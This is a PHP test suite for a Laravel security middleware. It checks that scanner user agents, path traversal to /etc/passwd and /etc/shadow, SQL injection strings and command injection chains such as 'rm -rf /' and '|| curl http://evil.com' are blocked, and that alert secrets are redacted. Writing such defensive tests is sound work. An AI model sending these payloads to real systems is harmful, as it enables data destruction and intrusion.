<?php

namespace Tests\Feature\Security;

use App\Models\AuditLog;
use App\Models\NotificationProvider;
use App\Models\SecurityEvent;
use App\Models\Tenant;
use App\Models\User;
use App\Services\IpThreatDefenseService;
use App\Services\JwtService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;
use Tests\TestCase;

class ProtectAttackMiddlewareTest extends TestCase
{
    use RefreshDatabase;

    public function test_vulnerability_scanners_are_blocked(): void
    {
        $maliciousAgents = [
            'sqlmap/1.5.2#stable',
            'Mozilla/5.0 (Nikto/2.1.6)',
            'WPScan v3.8.20',
            'gobuster/3.1.0',
            'masscan/1.0',
        ];

        foreach ($maliciousAgents as $agent) {
            $res = $this->withHeaders(['User-Agent' => $agent])
                ->getJson('/api/v1/health');

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'ATTACK_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'scanner_detected',
            ]);
        }
    }

    public function test_null_byte_injection_is_blocked(): void
    {
        $res = $this->get('/api/v1/health?param=test%00malicious');

        $res->assertStatus(400)
            ->assertJsonPath('status', 'error')
            ->assertJsonPath('code', 'INVALID_URI');

        $this->assertDatabaseHas('audit_logs', [
            'action' => 'security.attack_blocked',
            'entity_id' => 'null_byte_injection',
        ]);
    }

    public function test_path_traversal_is_blocked(): void
    {
        $traversalAttempts = [
            '/api/v1/health?file=../../../../etc/passwd',
            '/api/v1/health?path=..%2f..%2fetc%2fshadow',
            '/api/v1/health?doc=..\..\boot.ini',
            '/api/v1/health?view=/etc/hosts',
        ];

        foreach ($traversalAttempts as $uri) {
            $res = $this->getJson($uri);

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'PATH_TRAVERSAL_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'path_traversal',
            ]);
        }
    }

    public function test_command_injection_chains_in_query_are_blocked(): void
    {
        $cmdInjections = [
            '/api/v1/health?search=data;+rm+-rf+/',
            '/api/v1/health?query=foo&&+whoami',
            '/api/v1/health?filter=bar||+curl+http://evil.com',
        ];

        foreach ($cmdInjections as $uri) {
            $res = $this->getJson($uri);

            $res->assertStatus(403)
                ->assertJsonPath('status', 'error')
                ->assertJsonPath('code', 'COMMAND_INJECTION_DETECTED');

            $this->assertDatabaseHas('audit_logs', [
                'action' => 'security.attack_blocked',
                'entity_id' => 'command_injection',
            ]);
        }
    }

    public function test_payload_level_attacks_are_blocked(): void
    {
        // 1. SQL Injection in JSON payload
        $resSqli = $this->postJson('/api/v1/health', [
            'name' => "admin' OR '1'='1",
            'notes' => "UNION SELECT 1,2,3",
        ]);
        $resSqli->assertStatus(403)
            ->assertJsonPath('code', 'SQL_INJECTION_DETECTED');

        // 2. Command Injection in JSON payload
        $resCmd = $this->postJson('/api/v1/health', [
            'command' => 'test; rm -rf /',
        ]);
        $resCmd->assertStatus(403)
            ->assertJsonPath('code', 'COMMAND_INJECTION_DETECTED');

        // 3. Path Traversal in JSON payload
        $resTraversal = $this->postJson('/api/v1/health', [
            'avatar' => '../../../../etc/passwd',
        ]);
        $resTraversal->assertStatus(403)
            ->assertJsonPath('code', 'PATH_TRAVERSAL_DETECTED');
    }

    public function test_legitimate_requests_receive_enterprise_security_headers(): void
    {
        $res = $this->getJson('/api/v1/health');

        $res->assertStatus(200);

        // Assert all security headers are injected
        $res->assertHeader('X-Content-Type-Options', 'nosniff');
        $res->assertHeader('X-Frame-Options', 'DENY');
        $res->assertHeader('X-XSS-Protection', '1; mode=block');
        $res->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $res->assertHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $res->assertHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    }

    /**
     * Acceptance (P1): Create providers for tenants A and B (B newest). Trigger A's incident
     * and an unauthenticated incident: neither reaches B. Spoofed X-Tenant-ID headers cannot hijack routing.
     */
    public function test_security_alerts_never_route_to_arbitrary_tenant_provider(): void
    {
        Cache::flush();

        $tenantA = Tenant::create(['name' => 'Alert Alpha', 'slug' => 'alert-alpha', 'status' => 'active']);
        $tenantB = Tenant::create(['name' => 'Alert Beta', 'slug' => 'alert-beta', 'status' => 'active']);

        $userA = User::factory()->create([
            'tenant_id' => $tenantA->id,
            'role' => 'admin',
            'email' => 'admin@alert-alpha.kh',
            'is_active' => true,
        ]);

        $tokenA = '111111:AlphaBotSecretToken';
        $chatA = '-100111111';
        NotificationProvider::create([
            'uuid' => (string) Str::uuid(),
            'tenant_id' => $tenantA->id,
            'name' => 'Tenant A Security Bot',
            'channel' => 'telegram',
            'provider' => 'telegram',
            'environment' => 'all',
            'is_enabled' => true,
            'credentials' => ['bot_token' => $tokenA, 'chat_id' => $chatA],
            'settings' => ['purpose' => 'security_alerts', 'default_chat_id' => $chatA],
        ]);

        // Tenant B is created AFTER Tenant A (newest ID overall!)
        $tokenB = '222222:BetaNewestBotSecretToken';
        $chatB = '-100222222';
        NotificationProvider::create([
            'uuid' => (string) Str::uuid(),
            'tenant_id' => $tenantB->id,
            'name' => 'Tenant B Security Bot',
            'channel' => 'telegram',
            'provider' => 'telegram',
            'environment' => 'all',
            'is_enabled' => true,
            'credentials' => ['bot_token' => $tokenB, 'chat_id' => $chatB],
            'settings' => ['purpose' => 'security_alerts', 'default_chat_id' => $chatB],
        ]);

        Http::fake([
            'https://api.telegram.org/*' => Http::response(['ok' => true, 'result' => ['message_id' => 1]], 200),
        ]);

        // 1. Trigger Tenant A's verified incident via real Bearer JWT (and attempt X-Tenant-ID spoof to B)
        $jwtA = app(JwtService::class)->generateTokenForUser($userA);
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.11'])
            ->withHeaders([
                'Authorization' => "Bearer {$jwtA}",
                'X-Tenant-ID' => (string) $tenantB->id,
            ])
            ->getJson('/api/v1/users?q=' . urlencode("UNION SELECT 1,2,3"))
            ->assertStatus(403);

        Http::assertSent(fn ($req) => str_contains($req->url(), "bot{$tokenA}/sendMessage") && $req['chat_id'] === $chatA);
        Http::assertNotSent(fn ($req) => str_contains($req->url(), "bot{$tokenB}"));

        // 2. Trigger unauthenticated incident when NO platform provider exists (with spoofed X-Tenant-ID) -> reaches nobody
        $this->flushHeaders();
        Http::swap(new \Illuminate\Http\Client\Factory());
        Http::fake([
            'https://api.telegram.org/*' => Http::response(['ok' => true, 'result' => ['message_id' => 2]], 200),
        ]);

        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.12'])
            ->withHeaders(['X-Tenant-ID' => (string) $tenantB->id])
            ->getJson('/api/v1/health?file=../../../../etc/passwd')
            ->assertStatus(403);

        Http::assertNothingSent();

        // 3. Configure explicit platform security provider; unauthenticated incident hits ONLY platform provider, NEVER B or A
        $tokenPlatform = '999999:PlatformSecuritySecretToken';
        $chatPlatform = '-100999999';
        NotificationProvider::create([
            'uuid' => (string) Str::uuid(),
            'tenant_id' => null,
            'name' => 'CodeBridge Security Alert Bot',
            'channel' => 'telegram',
            'provider' => 'telegram',
            'environment' => 'all',
            'is_enabled' => true,
            'credentials' => ['bot_token' => $tokenPlatform, 'chat_id' => $chatPlatform],
            'settings' => ['purpose' => 'security_alerts', 'default_chat_id' => $chatPlatform],
        ]);

        $this->flushHeaders();
        Http::swap(new \Illuminate\Http\Client\Factory());
        Http::fake([
            'https://api.telegram.org/*' => Http::response(['ok' => true, 'result' => ['message_id' => 3]], 200),
        ]);

        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.13'])
            ->withHeaders(['X-Tenant-ID' => (string) $tenantB->id])
            ->getJson('/api/v1/health?file=../../../../etc/passwd')
            ->assertStatus(403);

        Http::assertSent(fn ($req) => str_contains($req->url(), "bot{$tokenPlatform}/sendMessage") && $req['chat_id'] === $chatPlatform);
        Http::assertNotSent(fn ($req) => str_contains($req->url(), "bot{$tokenB}") || str_contains($req->url(), "bot{$tokenA}"));
    }

    /**
     * Acceptance (P1): Query-string parameters are redacted in Telegram alerts/events, and simulated
     * HTTP exceptions containing bot URL + sensitive query values never leak secrets into logs.
     */
    public function test_security_alerts_redact_query_parameters_and_sanitize_exception_logs(): void
    {
        Cache::flush();

        $botToken = '555555:AlertExceptionSecretBotToken';
        $chatId = '-100555555';
        $sensitiveTokenParam = 'SUPER_SECRET_BEARER_QUERY_PARAM_987';
        $sensitiveCustomParam = 'PRIVATE_CUSTOMER_SECRET_VALUE_654';

        NotificationProvider::create([
            'uuid' => (string) Str::uuid(),
            'tenant_id' => null,
            'name' => 'CodeBridge Security Alert Bot',
            'channel' => 'telegram',
            'provider' => 'telegram',
            'environment' => 'all',
            'is_enabled' => true,
            'credentials' => ['bot_token' => $botToken, 'chat_id' => $chatId],
            'settings' => ['purpose' => 'security_alerts', 'default_chat_id' => $chatId],
        ]);

        // Part A: Capture outgoing Telegram alert + SecurityEvent URI redaction
        $capturedText = '';
        Http::fake(function ($request) use (&$capturedText) {
            $capturedText = (string) ($request['text'] ?? '');

            return Http::response(['ok' => true, 'result' => ['message_id' => 10]], 200);
        });

        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.21'])
            ->getJson('/api/v1/health?token=' . $sensitiveTokenParam . '&custom_payload=' . urlencode('../../../../etc/passwd/' . $sensitiveCustomParam))
            ->assertStatus(403);

        $this->assertNotEmpty($capturedText);
        $this->assertStringNotContainsString($sensitiveTokenParam, $capturedText);
        $this->assertStringNotContainsString($sensitiveCustomParam, $capturedText);
        $this->assertStringContainsString('token=[REDACTED]', $capturedText);

        $recordedEvent = SecurityEvent::latest('id')->first();
        $this->assertNotNull($recordedEvent);
        $this->assertStringNotContainsString($sensitiveTokenParam, (string) ($recordedEvent->metadata['uri'] ?? ''));
        $this->assertStringNotContainsString($sensitiveCustomParam, (string) ($recordedEvent->metadata['uri'] ?? ''));

        // Part B: Simulate network exception containing bot URL + sensitive query value in both WAF & banIp
        Cache::flush();
        Http::fake(function () use ($botToken, $sensitiveCustomParam) {
            throw new ConnectionException(
                "cURL error 28: Timeout connecting to https://api.telegram.org/bot{$botToken}/sendMessage?api_key={$sensitiveCustomParam}"
            );
        });

        $warningLogs = [];
        Log::shouldReceive('warning')->atLeast()->twice()->andReturnUsing(function ($msg) use (&$warningLogs) {
            $warningLogs[] = (string) $msg;
        });
        Log::shouldReceive('info')->zeroOrMoreTimes();
        Log::shouldReceive('error')->zeroOrMoreTimes();

        // Trigger middleware Telegram failure + auto-ban Telegram failure
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.22'])
            ->withHeaders(['User-Agent' => 'sqlmap/1.7'])
            ->getJson('/api/v1/health?secret=' . $sensitiveTokenParam)
            ->assertStatus(403);

        $mockRequest = \Illuminate\Http\Request::create(
            '/api/v1/users?token=' . $sensitiveTokenParam . '&note=' . $sensitiveCustomParam,
            'GET'
        );
        IpThreatDefenseService::banIp('198.51.100.23', 10, 'Simulated ban', 'manual_admin_ban', $mockRequest);

        $combinedLogs = implode("\n", $warningLogs);
        $this->assertNotEmpty($combinedLogs);
        $this->assertStringContainsString('/bot[REDACTED]/', $combinedLogs);
        $this->assertStringNotContainsString($botToken, $combinedLogs);
        $this->assertStringNotContainsString($sensitiveCustomParam, $combinedLogs);
        $this->assertStringNotContainsString($sensitiveTokenParam, $combinedLogs);

        IpThreatDefenseService::unbanIp('198.51.100.23');
    }

    public function test_trust_proxies_runs_before_protect_attack_middleware_without_wildcard_spoofing(): void
    {
        Cache::flush();

        // 1. Trusted K3s/Docker proxy IP (10.42.0.1) forwards real client IP in X-Forwarded-For
        $this->withServerVariables(['REMOTE_ADDR' => '10.42.0.1'])
            ->withHeaders([
                'X-Forwarded-For' => '203.0.113.45',
                'User-Agent' => 'sqlmap/1.7',
            ])
            ->getJson('/api/v1/health')
            ->assertStatus(403)
            ->assertJsonPath('code', 'ATTACK_DETECTED');

        $trustedEvent = SecurityEvent::latest('id')->first();
        $this->assertNotNull($trustedEvent);
        $this->assertSame('203.0.113.45', $trustedEvent->ip_address);
        $this->assertNull(IpThreatDefenseService::isBanned('10.42.0.1'));

        // 2. Untrusted public IP cannot spoof X-Forwarded-For (config/trustedproxy.php is not '*')
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.50'])
            ->withHeaders([
                'X-Forwarded-For' => '203.0.113.99',
                'User-Agent' => 'sqlmap/1.7',
            ])
            ->getJson('/api/v1/health')
            ->assertStatus(403)
            ->assertJsonPath('code', 'ATTACK_DETECTED');

        $untrustedEvent = SecurityEvent::latest('id')->first();
        $this->assertNotNull($untrustedEvent);
        $this->assertSame('198.51.100.50', $untrustedEvent->ip_address);
    }
}

